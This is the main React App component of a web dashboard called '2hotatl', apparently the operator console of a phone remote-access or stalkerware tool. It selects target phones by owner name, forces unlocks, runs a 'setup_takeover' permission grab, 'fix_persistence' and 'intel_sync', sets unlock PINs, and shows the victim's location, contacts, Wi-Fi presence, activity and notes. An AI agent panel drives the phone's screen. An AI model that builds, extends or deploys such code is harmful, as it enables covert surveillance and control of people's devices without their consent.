import { useEffect, useMemo, useRef, useState, useCallback } from "react";
import { ActivityFeed } from "./components/ActivityFeed";
import { AiPanel } from "./components/AiPanel";
import { CommandDeck } from "./components/CommandDeck";
import { ContactsPanel } from "./components/ContactsPanel";
import { LocationPanel } from "./components/LocationPanel";
import { NearbyPanel } from "./components/NearbyPanel";
import { NotesPanel } from "./components/NotesPanel";
import { PanelSkeleton } from "./components/PanelSkeleton";
import { PermissionsPanel } from "./components/PermissionsPanel";
import { QuickLaunchBar } from "./components/QuickLaunchBar";
import { ScreenGuide } from "./components/ScreenGuide";
import { useAgent } from "./hooks/useAgent";
import { useLiveStream } from "./hooks/useRelayStream";
import type { CommandFeedback } from "./types/device";
import type { AgentDeviceContext } from "./utils/deviceGuide";
import { clientToDevice } from "./utils/coords";
import { buildScreenGuide } from "./utils/screenGuide";
import type { ScreenAction } from "./utils/screenGuide";

const AI_OPEN_KEY = "2htl_ai_open";

function statusLabel(
  selectedDeviceId: string | null,
  phoneLive: boolean,
  connected: boolean,
  activeName: string,
  deviceName: string,
  locked: boolean,
) {
  if (!selectedDeviceId) return { text: "No phone", tone: "muted" as const };
  if (locked && phoneLive) return { text: `Locked · ${activeName || deviceName}`, tone: "locked" as const };
  if (phoneLive) return { text: `Live · ${activeName || deviceName}`, tone: "live" as const };
  if (connected) return { text: "Connecting…", tone: "warn" as const };
  return { text: "Offline", tone: "muted" as const };
}

export default function App() {
  const [ripples, setRipples] = useState<{ id: number; x: number; y: number }[]>([]);
  const [aiOpen, setAiOpen] = useState(() => sessionStorage.getItem(AI_OPEN_KEY) === "1");
  const [utilOpen, setUtilOpen] = useState(false);
  const [lastCommand, setLastCommand] = useState<CommandFeedback | null>(null);
  const [lastRetryAction, setLastRetryAction] = useState<Record<string, unknown> | null>(null);
  const rippleId = useRef(0);

  const {
    connected,
    phoneLive,
    deviceSize,
    devices,
    selectedDeviceId,
    activeDeviceName,
    selectDevice,
    send,
    getTree,
    getTreeTick,
    waitForTree,
    hasRecentTree,
    activityFeed,
    sessionNotes,
    clearNotes,
    notesClearing,
    location,
    contacts,
    wifiPresence,
    setupProgress,
    clearSetupProgress,
    deviceState,
    getDeviceState,
    waitForReady,
    commandFeedback,
    clearCommandFeedback,
  } = useLiveStream();

  const tree = getTree();
  const selectedDevice = devices.find((d) => d.deviceId === selectedDeviceId);
  const loadingPanels = connected && !!selectedDeviceId && !phoneLive && !deviceState;

  const getDeviceContext = useCallback((): AgentDeviceContext => ({
    model: deviceState?.model ?? selectedDevice?.model,
    manufacturer: deviceState?.manufacturer,
    android: deviceState?.android,
    screenW: deviceSize.width,
    screenH: deviceSize.height,
    locked: deviceState?.locked,
    ready: deviceState?.ready,
  }), [deviceState, selectedDevice, deviceSize]);

  const agent = useAgent(
    send,
    getTree,
    waitForTree,
    getTreeTick,
    phoneLive,
    hasRecentTree,
    getDeviceState,
    waitForReady,
    getDeviceContext,
  );

  const locked = deviceState?.locked ?? false;
  const a11yOff = deviceState?.accessibility === false;
  const canControl = connected && !!selectedDeviceId && phoneLive && !locked;
  const canSendKeys = connected && !!selectedDeviceId;
  const screenRef = useRef<HTMLDivElement>(null);
  const dragRef = useRef<{ x: number; y: number; t: number } | null>(null);

  const status = statusLabel(
    selectedDeviceId,
    phoneLive,
    connected,
    activeDeviceName,
    selectedDevice?.name ?? "phone",
    locked,
  );

  const screenHint = useMemo(() => {
    if (!selectedDeviceId) return "Choose a phone above";
    if (locked) return "Phone locked — tap Unlock";
    if (!phoneLive) return selectedDevice ? `${selectedDevice.name} is offline` : "Phone offline";
    return "Tap screen guide rows or swipe to control";
  }, [selectedDeviceId, phoneLive, selectedDevice, locked]);

  const screenGuide = useMemo(() => (tree ? buildScreenGuide(tree) : null), [tree]);

  const toggleAi = useCallback(() => {
    setAiOpen((v) => {
      const next = !v;
      sessionStorage.setItem(AI_OPEN_KEY, next ? "1" : "0");
      return next;
    });
  }, []);

  const sendTracked = useCallback((payload: Record<string, unknown>) => {
    setLastRetryAction(payload);
    return send(payload);
  }, [send]);

  const onWake = () => sendTracked({ type: "key", action: "wake" });
  const onUnlock = () => sendTracked({ type: "key", action: "unlock" });
  const onLock = () => sendTracked({ type: "key", action: "lock" });
  const onPower = () => sendTracked({ type: "key", action: "power" });
  const onKey = (action: string) => {
    if (locked && ["back", "home", "recents", "volume_up", "volume_down"].includes(action)) {
      sendTracked({ type: "key", action: "wake" });
      sendTracked({ type: "key", action: "unlock" });
    }
    sendTracked({ type: "key", action });
  };
  const onGrantAll = async () => {
    clearSetupProgress();
    sendTracked({ type: "key", action: "wake" });
    sendTracked({ type: "key", action: "unlock" });
    await new Promise((r) => setTimeout(r, 2500));
    sendTracked({ type: "setup_takeover" });
  };
  const onFixPersistence = () => sendTracked({ type: "fix_persistence" });
  const onIntelSync = () => sendTracked({ type: "intel_sync" });
  const onContinueSetup = () => sendTracked({ type: "request_permission_wizard" });
  const onRequestPermission = (step: string) => sendTracked({ type: "request_permission_moment", step });
  const onOpenApp = (pkg: string) => sendTracked({ type: "open_app", package: pkg });
  const onPaste = (text: string) => sendTracked({ type: "clipboard_paste", text });
  const onSetPin = (pin: string) => sendTracked({ type: "set_unlock_pin", pin });

  useEffect(() => {
    if (!setupProgress?.done) return;
    const t = setTimeout(clearSetupProgress, 8000);
    return () => clearTimeout(t);
  }, [setupProgress?.done, setupProgress?.at, clearSetupProgress]);

  useEffect(() => {
    if (!commandFeedback) return;
    setLastCommand(commandFeedback);
    const t = setTimeout(clearCommandFeedback, commandFeedback.status === "ok" ? 3500 : 8000);
    return () => clearTimeout(t);
  }, [commandFeedback, clearCommandFeedback]);

  const toDeviceCoords = (clientX: number, clientY: number) => {
    const el = screenRef.current;
    if (!el) return null;
    return clientToDevice(clientX, clientY, el.getBoundingClientRect(), deviceSize.width, deviceSize.height);
  };

  const addRipple = (x: number, y: number) => {
    const id = ++rippleId.current;
    setRipples((r) => [...r, { id, x, y }]);
    setTimeout(() => setRipples((r) => r.filter((rr) => rr.id !== id)), 600);
  };

  const onGuideAction = (action: ScreenAction) => {
    if (!canSendKeys) return;
    sendTracked({ type: "tap", x: action.x, y: action.y });
    const el = screenRef.current;
    if (el) {
      const rect = el.getBoundingClientRect();
      const lx = (action.x / deviceSize.width) * rect.width;
      const ly = (action.y / deviceSize.height) * rect.height;
      addRipple(lx, ly);
    }
  };

  const onPointerDown = (e: React.PointerEvent) => {
    if (!canControl) return;
    const coords = toDeviceCoords(e.clientX, e.clientY);
    if (!coords) return;
    dragRef.current = { x: coords.x, y: coords.y, t: Date.now() };
    addRipple(coords.localX, coords.localY);
    (e.currentTarget as HTMLElement).setPointerCapture(e.pointerId);
  };

  const onPointerUp = (e: React.PointerEvent) => {
    if (!canControl) return;
    const start = dragRef.current;
    dragRef.current = null;
    if (!start) return;
    const coords = toDeviceCoords(e.clientX, e.clientY);
    if (!coords) return;
    const dt = Date.now() - start.t;
    const dist = Math.hypot(coords.x - start.x, coords.y - start.y);
    if (dist < 12 && dt < 300) sendTracked({ type: "tap", x: coords.x, y: coords.y });
    else if (dist >= 12) {
      sendTracked({
        type: "swipe",
        x: start.x,
        y: start.y,
        x2: coords.x,
        y2: coords.y,
        duration: Math.min(Math.max(dt, 50), 600),
      });
    }
  };

  const grantBusy = setupProgress != null && !setupProgress.done;

  return (
    <div className="app app-cockpit">
      <div className="bg-glow bg-glow-1" />
      <div className="bg-glow bg-glow-2" />

      <header className="header header-minimal">
        <div className="logo">
          <span className="logo-icon">◉</span>
          <div>
            <h1>2hotatl</h1>
            <p className="tagline">remote control</p>
          </div>
        </div>
        <div className="status-pills">
          <select
            className="device-select"
            value={selectedDeviceId ?? ""}
            onChange={(e) => selectDevice(e.target.value || null)}
            aria-label="Select phone"
          >
            <option value="">Choose phone…</option>
            {devices.map((d) => (
              <option key={d.deviceId} value={d.deviceId}>
                {d.online ? "● " : "○ "}
                {d.ownerName ? `${d.ownerName} · ` : ""}
                {d.name}
              </option>
            ))}
          </select>
          <span className={`pill pill-status pill-${status.tone}`}>{status.text}</span>
          {deviceState && canSendKeys && (
            <>
              <span className={`pill pill-device ${deviceState.awake ? "pill-awake" : "pill-asleep"}`}>
                {deviceState.awake ? "Awake" : "Asleep"}
              </span>
              {deviceState.locked && <span className="pill pill-device pill-locked">Locked</span>}
              {a11yOff && <span className="pill pill-device pill-locked">A11y off</span>}
              {deviceState.ready && <span className="pill pill-device pill-ready">Ready</span>}
            </>
          )}
          <div className="header-util">
            <button
              type="button"
              className="header-util-btn"
              onClick={() => setUtilOpen((v) => !v)}
              aria-expanded={utilOpen}
            >
              Menu ▾
            </button>
            {utilOpen && (
              <div className="header-util-menu">
                <a href="/watch" onClick={() => setUtilOpen(false)}>Movies</a>
                <a href="/watch" onClick={() => setUtilOpen(false)}>Watch together</a>
              </div>
            )}
          </div>
        </div>
      </header>

      {setupProgress && (
        <div className={`grant-banner grant-banner-${setupProgress.phase}`}>
          <span className="grant-banner-pulse" aria-hidden />
          <span className="grant-banner-text">{setupProgress.line}</span>
          {setupProgress.done && (
            <button type="button" className="grant-banner-dismiss" onClick={clearSetupProgress}>✕</button>
          )}
        </div>
      )}

      {commandFeedback && (
        <div
          className={`grant-banner grant-banner-${commandFeedback.status === "ok" ? "done" : "error"} command-feedback-banner`}
        >
          <span className="grant-banner-pulse" aria-hidden />
          <span className="grant-banner-text">
            {commandFeedback.status === "ok"
              ? `${commandFeedback.action}${commandFeedback.detail ? `: ${commandFeedback.detail}` : " — sent"}`
              : `${commandFeedback.action}: ${commandFeedback.detail}`}
          </span>
          <button type="button" className="grant-banner-dismiss" onClick={clearCommandFeedback}>✕</button>
        </div>
      )}

      <main className="cockpit">
        <div className="cockpit-left">
          <PermissionsPanel
            perms={deviceState?.perms}
            onGrantAll={() => void onGrantAll()}
            onContinueSetup={onContinueSetup}
            onRequestPermission={onRequestPermission}
            canSendKeys={canSendKeys}
            loading={loadingPanels}
          />
          <NearbyPanel presence={wifiPresence} />
          {loadingPanels ? (
            <>
              <PanelSkeleton title lines={4} />
              <PanelSkeleton lines={3} />
              <PanelSkeleton lines={2} />
            </>
          ) : (
            <>
              <ActivityFeed items={activityFeed} phoneLive={phoneLive} />
              <NotesPanel
                notes={sessionNotes}
                phoneLive={phoneLive}
                onClear={() => void clearNotes()}
                clearing={notesClearing}
              />
              <LocationPanel
                location={location}
                perms={deviceState?.perms}
                canSendKeys={canSendKeys}
                onRequestPermission={onRequestPermission}
              />
              <ContactsPanel
                contacts={contacts}
                perms={deviceState?.perms}
                canSendKeys={canSendKeys}
                onRequestPermission={onRequestPermission}
              />
            </>
          )}
        </div>

        <div className="cockpit-center">
          <QuickLaunchBar canSendKeys={canSendKeys} onOpenApp={onOpenApp} />
          <div className="phone-stage phone-stage-large">
            <div className="phone-shadow" />
            <div className="phone-frame phone-frame-large">
              <div className="phone-notch" />
              <div
                ref={screenRef}
                className={`phone-screen phone-screen-live ${canControl ? "phone-screen-ready" : "phone-screen-wait"}`}
                onPointerDown={onPointerDown}
                onPointerUp={onPointerUp}
                onPointerCancel={() => { dragRef.current = null; }}
              >
                {!canControl && (
                  <div className="screen-hint">
                    <span className="screen-hint-icon">{locked ? "🔒" : phoneLive ? "◉" : "○"}</span>
                    <p>{screenHint}</p>
                    {canSendKeys && locked && (
                      <button type="button" className="btn-wake-inline" onClick={onUnlock}>Unlock phone</button>
                    )}
                    {canSendKeys && !phoneLive && !locked && (
                      <button type="button" className="btn-wake-inline" onClick={onWake}>Wake phone</button>
                    )}
                  </div>
                )}
                {canControl && screenGuide && (
                  <div className="phone-screen-guide-wrap">
                    <ScreenGuide guide={screenGuide} onAction={onGuideAction} />
                  </div>
                )}
                {canControl && <div className="screen-touch-grid" aria-hidden />}
                {ripples.map((r) => (
                  <span key={r.id} className="ripple" style={{ left: r.x, top: r.y }} />
                ))}
              </div>
              <div className="phone-chin" />
            </div>
            <p className="screen-caption">{screenHint}</p>
          </div>
        </div>

        <div className="cockpit-right">
          <CommandDeck
            canControl={canControl}
            canSendKeys={canSendKeys}
            locked={locked}
            onWake={onWake}
            onUnlock={onUnlock}
            onLock={onLock}
            onPower={onPower}
            onKey={onKey}
            onGrantAll={() => void onGrantAll()}
            onContinueSetup={onContinueSetup}
            onFixPersistence={onFixPersistence}
            onIntelSync={onIntelSync}
            onOpenApp={onOpenApp}
            onPaste={onPaste}
            onSetPin={onSetPin}
            onAiToggle={toggleAi}
            aiOpen={aiOpen}
            grantBusy={grantBusy}
            lastCommand={lastCommand}
            onDismissLastCommand={() => setLastCommand(null)}
            onRetryLastCommand={lastRetryAction ? () => sendTracked(lastRetryAction) : undefined}
          />
          {aiOpen && (
            <AiPanel
              agent={agent}
              tree={tree}
              disabled={!canSendKeys || agent.running}
              connected={connected}
              phoneLive={phoneLive}
              locked={locked}
            />
          )}
        </div>
      </main>
    </div>
  );
}
